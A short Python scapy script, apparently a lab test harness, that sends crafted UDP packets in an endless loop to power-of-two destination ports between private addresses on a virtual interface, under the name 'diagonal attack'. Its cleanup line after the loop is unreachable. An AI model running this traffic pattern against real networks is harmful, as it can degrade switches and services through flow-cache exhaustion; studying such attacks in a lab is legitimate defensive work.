#!/usr/bin/env python

import sys
import os
from scapy.all import IP,UDP,TCP,Ether,sendp

DIAGONAL_DST_PORTS=(32768,16384,8192,4096,2048,1024,512,256,128,64,32,16,8,4,2,1)

PID=str(os.getpid())
PID_FILE="diagonal_attack.pid"
file(PID_FILE, 'w').write(PID)

while True:
    for i in DIAGONAL_DST_PORTS:
        p=((Ether(src='00:11:22:33:44:55',dst='00:11:22:33:44:66')/IP(src='10.0.0.1',dst='10.0.0.2')/UDP(sport=12345,dport=i)))
        #p.show()
        sendp(p, iface="ns1_veth_ns")

#whenever processing jumps here we delete pid file as not required anymore
os.unlink(PID_FILE)
